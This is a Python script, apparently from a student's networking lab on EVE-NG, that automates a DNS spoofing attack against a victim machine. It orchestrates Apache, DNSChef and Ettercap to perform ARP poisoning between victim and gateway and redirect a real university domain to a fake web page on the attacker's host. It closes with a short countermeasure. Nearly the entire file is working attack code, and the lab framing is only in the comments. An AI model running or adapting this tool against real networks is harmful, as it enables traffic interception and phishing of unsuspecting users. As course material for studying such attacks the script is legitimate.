#!/usr/bin/env python3
# =============================================================================
# DNS Spoofing Attack Script
# =============================================================================
# Autor:       Roger Rodriguez
# Matricula:   20250757
# Asignatura:  Networking
# Plataforma:  EVE-NG
# Fecha:       Junio 2026

# Link:       https://youtu.be/nQchsKQuzgs
# =============================================================================
# Descripcion:
#   Este script automatiza el ataque de DNS Spoofing utilizando DNSChef y
#   Ettercap. Intercepta las consultas DNS de la victima y las redirige hacia
#   una pagina web falsa alojada en el atacante (Kali Linux).
#
# Requisitos:
#   - Kali Linux con permisos root
#   - Apache2 instalado y configurado
#   - Ettercap instalado: sudo apt install ettercap-text-only -y
#   - DNSChef instalado:  sudo apt install dnschef -y
#   - /etc/ettercap/etter.dns configurado con itla.edu.do A <ATTACKER_IP>
#
# Uso:
#   sudo python3 dns_spoof_attack.py
# =============================================================================

import os
import sys
import time
import subprocess
import signal
import argparse

# ─── CONFIGURACION ─────────────────────────────────────────────────────────────
ATTACKER_IP   = "25.7.10.10"       # IP del atacante (Kali - VLAN 10)
VICTIM_IP     = "25.7.20.20"       # IP de la victima (Ubuntu - VLAN 20)
GATEWAY_IP    = "25.7.20.1"        # Gateway de la victima (R1 VLAN 20)
INTERFACE     = "eth0"             # Interfaz de red del atacante
FAKE_DOMAIN   = "itla.edu.do"      # Dominio a falsificar
FAKE_PAGE     = "/var/www/html/index.html"  # Ruta de la pagina falsa
ETTER_DNS     = "/etc/ettercap/etter.dns"   # Archivo de configuracion DNS

# ─── COLORES ───────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Procesos globales para cleanup
procs = []

# ─── FUNCIONES DE UTILIDAD ─────────────────────────────────────────────────────

def banner():
    print(f"""
{BLUE}{BOLD}
╔══════════════════════════════════════════════════════════╗
║           DNS SPOOFING / DNS POISONING ATTACK            ║
║──────────────────────────────────────────────────────────║
║  Autor    : Roger Rodriguez                              ║
║  Matricula: 20250757                                     ║
║  Curso    : Networking — EVE-NG                          ║
║  Target   : {FAKE_DOMAIN:<44} ║
║  Redirige : {FAKE_DOMAIN} → {ATTACKER_IP:<24}  ║
╚══════════════════════════════════════════════════════════╝
{RESET}""")

def log(msg, color=GREEN, symbol="[+]"):
    print(f"{color}{BOLD}{symbol}{RESET} {msg}")

def info(msg):
    log(msg, CYAN, "[*]")

def warn(msg):
    log(msg, YELLOW, "[!]")

def error(msg):
    log(msg, RED, "[-]")
    sys.exit(1)

def step(num, msg):
    print(f"\n{BLUE}{BOLD}{'─'*55}{RESET}")
    print(f"{BLUE}{BOLD}  PASO {num}: {msg}{RESET}")
    print(f"{BLUE}{BOLD}{'─'*55}{RESET}")

def cleanup(sig=None, frame=None):
    print(f"\n{YELLOW}{BOLD}[!] Deteniendo el ataque y limpiando procesos...{RESET}")
    for p in procs:
        try:
            p.terminate()
            p.wait(timeout=3)
            log(f"Proceso {p.pid} detenido.", YELLOW, "[~]")
        except Exception:
            pass
    print(f"{GREEN}{BOLD}[+] Ataque detenido correctamente.{RESET}\n")
    sys.exit(0)

# ─── VERIFICACIONES ────────────────────────────────────────────────────────────

def check_root():
    step(0, "Verificando permisos")
    if os.geteuid() != 0:
        error("Este script requiere permisos root. Ejecuta: sudo python3 dns_spoof_attack.py")
    log("Ejecutando como root.")

def check_tools():
    tools = ["ettercap", "dnschef", "apache2"]
    for tool in tools:
        result = subprocess.run(["which", tool], capture_output=True)
        if result.returncode != 0:
            error(f"Herramienta no encontrada: {tool}. Instala con: sudo apt install {tool} -y")
        log(f"{tool} encontrado.")

def check_files():
    if not os.path.exists(FAKE_PAGE):
        error(f"Pagina falsa no encontrada en {FAKE_PAGE}. Crea el archivo primero.")
    log(f"Pagina falsa encontrada: {FAKE_PAGE}")

    if not os.path.exists(ETTER_DNS):
        error(f"Archivo etter.dns no encontrado en {ETTER_DNS}")

    with open(ETTER_DNS) as f:
        content = f.read()
    if FAKE_DOMAIN not in content:
        error(f"Entrada DNS para {FAKE_DOMAIN} no encontrada en {ETTER_DNS}.\nAgrega: {FAKE_DOMAIN}  A  {ATTACKER_IP}")
    log(f"etter.dns configurado correctamente para {FAKE_DOMAIN}.")

# ─── PASOS DEL ATAQUE ──────────────────────────────────────────────────────────

def start_apache():
    step(1, "Iniciando servidor web Apache2 (pagina falsa)")
    result = subprocess.run(["systemctl", "start", "apache2"], capture_output=True)
    if result.returncode != 0:
        error("No se pudo iniciar Apache2.")
    log("Apache2 iniciado correctamente.")
    info(f"Pagina falsa disponible en: http://{ATTACKER_IP}/")

def enable_ip_forward():
    step(2, "Habilitando IP Forwarding")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    log("IP Forwarding habilitado.")
    info("Esto permite que el trafico de la victima sea reenviado correctamente.")

def start_dnschef():
    step(3, "Iniciando DNSChef (servidor DNS falso)")
    cmd = [
        "dnschef",
        f"--fakeip={ATTACKER_IP}",
        f"--fakedomains={FAKE_DOMAIN}",
        f"--interface={ATTACKER_IP}"
    ]
    info(f"Comando: {' '.join(cmd)}")
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    procs.append(proc)
    time.sleep(2)
    if proc.poll() is not None:
        error("DNSChef no pudo iniciarse.")
    log(f"DNSChef corriendo (PID {proc.pid}).")
    info(f"DNS falso activo: {FAKE_DOMAIN} → {ATTACKER_IP}")

def start_ettercap():
    step(4, "Iniciando Ettercap (ARP Poisoning + DNS Spoof)")
    cmd = [
        "ettercap", "-T", "-q",
        "-i", INTERFACE,
        "-M", "arp:remote",
        f"/{VICTIM_IP}//",
        f"/{GATEWAY_IP}//",
        "-P", "dns_spoof"
    ]
    info(f"Comando: {' '.join(cmd)}")
    info(f"Victima:  {VICTIM_IP}")
    info(f"Gateway:  {GATEWAY_IP}")
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    procs.append(proc)
    time.sleep(4)
    if proc.poll() is not None:
        out, err = proc.communicate()
        error(f"Ettercap no pudo iniciarse.\n{err.decode()}")
    log(f"Ettercap corriendo (PID {proc.pid}).")
    log("ARP Poisoning activo entre victima y gateway.")
    log("Plugin dns_spoof activo.")

def show_status():
    step(5, "Ataque en progreso")
    print(f"""
{GREEN}{BOLD}
  ✅ Apache2     → Sirviendo pagina falsa en {ATTACKER_IP}
  ✅ DNSChef     → {FAKE_DOMAIN} resuelve a {ATTACKER_IP}
  ✅ Ettercap    → ARP Poisoning activo
  ✅ DNS Spoof   → Plugin activo

  🎯 Cuando la victima ({VICTIM_IP}) consulte:
     {FAKE_DOMAIN} → recibira {ATTACKER_IP} (IP falsa)
     Al acceder al sitio → vera la pagina falsa

  ⌨️  Presiona CTRL+C para detener el ataque
{RESET}""")

def verify_attack():
    step(6, "Verificacion del ataque")
    info("Ejecuta estos comandos en la victima para verificar:")
    print(f"""
  {CYAN}# Verificar resolucion DNS falsa{RESET}
  nslookup {FAKE_DOMAIN}
  {GREEN}# Resultado esperado: Address: {ATTACKER_IP}{RESET}

  {CYAN}# Verificar carga de pagina falsa{RESET}
  curl http://{FAKE_DOMAIN}
  {GREEN}# Resultado esperado: HTML de pagina falsa ITLA{RESET}
""")

def show_contramedida():
    print(f"""
{YELLOW}{BOLD}
╔══════════════════════════════════════════════════════════╗
║                    CONTRA-MEDIDA                         ║
║──────────────────────────────────────────────────────────║
║  Agregar entrada estatica en /etc/hosts de la victima:   ║
║                                                          ║
║  echo '104.26.13.23  {FAKE_DOMAIN}' >> /etc/hosts       ║
║                                                          ║
║  Esto hace que la victima ignore el DNS falso y          ║
║  resuelva siempre la IP real del dominio.                ║
╚══════════════════════════════════════════════════════════╝
{RESET}""")

# ─── IMAGENES CLAVE (OPCIONAL) ─────────────────────────────────────────────────

def show_image_guide():
    """
    Guia para agregar capturas de pantalla clave al repositorio GitHub.
    Coloca las imagenes en la carpeta /screenshots/ del repositorio.

    Imagenes recomendadas:
      1. screenshots/01_etter_dns_config.png
         → Captura del archivo /etc/ettercap/etter.dns configurado |<img width="303" height="75" alt="image" src="https://github.com/user-attachments/assets/b7df2251-16d4-48c0-b76f-016e84d20276" />
 |

      2. screenshots/02_ettercap_running.png
         → Ettercap corriendo con ARP Poisoning y dns_spoof activo |<img width="669" height="547" alt="image" src="https://github.com/user-attachments/assets/c1f42aef-67cb-49b9-b744-9b571d970c04" />
|

      3. screenshots/03_nslookup_victim.png
         → nslookup itla.edu.do desde Ubuntu mostrando 25.7.10.10 |<img width="620" height="320" alt="image" src="https://github.com/user-attachments/assets/08df409b-203d-41fb-9431-1eead9d39a1d" />
|

      4. screenshots/04_fake_page_curl.png
         → curl http://itla.edu.do mostrando la pagina falsa de ITLA|<img width="975" height="675" alt="image" src="https://github.com/user-attachments/assets/a6b5ed8e-8d90-4299-ab0d-381bb437709d" />
|

    Para mostrarlas en el README.md de GitHub:
      ![etter.dns config](screenshots/01_etter_dns_config.png)
      ![Ettercap running](screenshots/02_ettercap_running.png)
      ![nslookup victim](screenshots/03_nslookup_victim.png)
      ![Fake page](screenshots/04_fake_page_curl.png)
    """
    pass

# ─── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    banner()

    check_root()
    check_tools()
    check_files()

    start_apache()
    enable_ip_forward()
    start_dnschef()
    start_ettercap()
    show_status()
    verify_attack()
    show_contramedida()

    # Mantener el script corriendo hasta CTRL+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()
